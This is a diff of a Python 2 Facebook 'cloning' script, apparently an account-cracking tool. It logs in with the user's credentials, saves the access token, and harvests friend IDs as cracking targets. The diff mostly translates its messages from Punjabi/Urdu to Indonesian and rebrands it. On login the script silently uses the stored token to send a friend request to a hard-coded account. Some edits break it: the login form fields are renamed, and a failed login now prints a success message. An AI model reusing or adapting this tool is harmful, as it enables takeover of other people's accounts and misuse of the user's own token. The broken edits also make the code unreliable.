@@ -48,7 +48,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.001)
 
-#Dev:+
+#Dev:SHELAA CHAN PUNYA GW
 ##### LOGO #####
 logo = """
 \033[1;92mZero & ZxXx-Angel
@@ -139,10 +139,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "password"
-            os.system('xdg-open https://https://instagram.com/zero_xvip')
+            os.system('xdg-open https://https://www.instagram.com/zero_xvip')
     else:
         print "Nama Pengguna Salah"
-        os.system('xdg-open https://https://instagram.com/zero_xvip')
+        os.system('xdg-open https://https://www.instagram.com/zero_xvip')
 
 def login():
 	os.system('clear')
@@ -153,9 +153,9 @@ def login():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		print('\033[1;96m[☆] \x1b[1;93mFacebook nal login kar knjra \x1b[1;96m[☆]' )
-		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Ihr mail daal\x1b[1;91m: \x1b[1;92m')
-		pwd = raw_input('\033[1;96m[+] \x1b[1;93mIdhr password paa dy \x1b[1;91m: \x1b[1;92m')
+		print('\033[1;96m[☆] \x1b[1;93mLogin Facebook \x1b[1;96m[☆]' )
+		id = raw_input('\033[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m')
+		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword \x1b[1;91m: \x1b[1;92m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -164,8 +164,8 @@ def login():
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
+		br.form['Email'] = id
+		br.form['Pass'] = pwd
 		br.submit()
 		url = br.geturl()
 		if 'save-device' in url:
@@ -183,19 +183,19 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Ha hogi login Mamu...'
-				os.system('xdg-open https://https://www.youtube.com/channel/UCcnemPa1LxyajQhlVbEEvcg')
+				os.system('xdg-open https://https://www.instagram.com/zero_xvip')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
-				print"\n\x1b[1;91m[!] Mama internet nhi hy tera"
+				print"\n\x1b[1;91m[!] Error"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\x1b[1;92m[!] Tera Account thik ni o")
+			print("\n\x1b[1;92m[!] SepertiNya Akun Anda Terkena CheckPoint")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
 		else:
-			print("\n\x1b[1;93mTera password ya mail ghalt e knjra")
+			print("\n\x1b[1;93mBerhasil Login..")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
@@ -221,24 +221,24 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mTera Account thik ni o knjra"
+		print"\033[1;91mEhh... Kok Gak Ada Anjing Ilang Goblog!"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;92mThere is no internet connection"
+		print"\x1b[1;92mTidak Ada Internet!"
 		keluar()
 	os.system("clear")
 	print logo
-	print "          \033[1;33;40m     [1] \033[1;33;40m  Ha kryn hack kya?"	
-	print "          \033[1;33;40m     [2] \033[1;33;40m  Update krna ki"																														
-	print "          \033[1;33;40m     [0] \033[1;33;40m  Logout karna ki"
+	print "          \033[1;33;40m     [1] \033[1;33;40m  Mulai?"	
+	print "          \033[1;33;40m     [2] \033[1;33;40m  Update Script?"																														
+	print "          \033[1;33;40m     [0] \033[1;33;40m  Logout"
 	pilih()
 
 def pilih():
 	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
 	if unikers =="":
-		print "\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mIsi Dengan Benar😠"
 		pilih()
 	elif unikers =="1":
 		super()
@@ -254,7 +254,7 @@ def pilih():
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
-		print "\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mIsi Dengan Benar😠"
 		pilih()
 
 def super():
@@ -269,23 +269,23 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "          \x1b[1;33;40m [1] \033[1;33;40m     Tari id k friend clone "
-	print "          \x1b[1;33;40m [2] \033[1;33;40m     Kisi or dy karny ki"
-	print "          \x1b[1;33;40m [3] \033[1;33;40m     Target id chukni ki"
-	print "          \x1b[1;33;40m [4] \033[1;33;40m     Dfaa kr"
+	print "          \x1b[1;33;40m [1] \033[1;33;40m     Ambil ID Dari Teman"
+	print "          \x1b[1;33;40m [2] \033[1;33;40m     Ambil ID Teman Dari Teman"
+	print "          \x1b[1;33;40m [3] \033[1;33;40m     ID Target"
+	print "          \x1b[1;33;40m [4] \033[1;33;40m     Lakukan Sekali"
 	print "          \x1b[1;33;40m [0] \033[1;33;40m     Back"
 	pilih_super()
 
 def pilih_super():
 	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
 	if peak =="":
-		print "\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mIsi Dengan Benar!😠"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
 		print logo
 
-		jalan('\033[1;93m[✺] Ha sabr kar horhi clonning \033[1;97m...')
+		jalan('\033[1;93m[✺] Orang Sabar DiSayang Janda :v \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -300,10 +300,10 @@ def pilih_super():
 			op = json.loads(jok.text)
 			print"          \033[1;31;40m[✺] Name : "+op["name"]
 		except KeyError:
-			print"\x1b[1;92m[✺] ID ni lbhi!"
+			print"\x1b[1;92m[✺] ID"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"          \033[1;35;40m[✺]  ha sabr kr clonning hori..."
+		print"          \033[1;35;40m[✺]  Orang Sabar DiSayang Janda :v..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -316,29 +316,29 @@ def pilih_super():
 		os.system('clear')
 		print logo                  
 		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
+			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan Nama File \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
 				id.append(line.strip())
 		except IOError:
-			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
+			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile Tidak Ada'
 			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
 			super()
 	elif peak =="0":
 		menu()
 	else:
-		print "\x1b[1;91mFill in correctly"
+		print "\x1b[1;91mIsi Dengan Benar😠"
 		pilih_super()
 
 	
-	print "          \033[1;36;40m[⚔] Sariya id's : \033[1;94m"+str(len(id))
-	jalan('          \033[1;34;40m[⚔] Ha thora sabr...')
+	print "          \033[1;36;40m[⚔] Santuy.. : \033[1;94m"+str(len(id))
+	jalan('          \033[1;34;40m[⚔] Sabar Napa...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("                    \r\033[1;32;40m          [⚔] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;93m ❈           \x1b[1;97mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
+	print "\n\033[1;93m ❈           \x1b[1;97mUntuk Berhenti Tekan CTRL+Z \033[1;94m    ❈"
 	print "        \033[1;92m●═════════════════◄►════════════════●"
 
-	jalan('              \033[1;97mGoraya clonning start Wait kar thora...')
+	jalan('              \033[1;97mSedang Proses...')
 	print  "       \033[1;92m ●════════════════◄►════════════════●" 
 
 	def main(arg):
@@ -476,3 +476,4 @@ def pilih_super():
 
 if __name__ == '__main__':
 	login()
+Wy
